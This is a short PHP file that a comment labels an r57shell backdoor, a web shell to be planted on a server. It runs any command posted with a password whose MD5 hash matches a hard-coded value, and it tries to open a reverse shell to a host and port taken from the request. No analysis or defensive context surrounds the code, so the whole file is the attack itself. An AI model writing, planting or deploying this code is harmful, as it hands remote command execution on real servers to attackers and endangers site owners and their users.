<?php
// r57shell backdoor
if(md5($_POST['pass']) == "1a1dc91c907325c69271ddf0c944bc72") {
    @passthru($_POST['cmd']);
}
$sock = fsockopen($_GET['host'], $_GET['port']);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
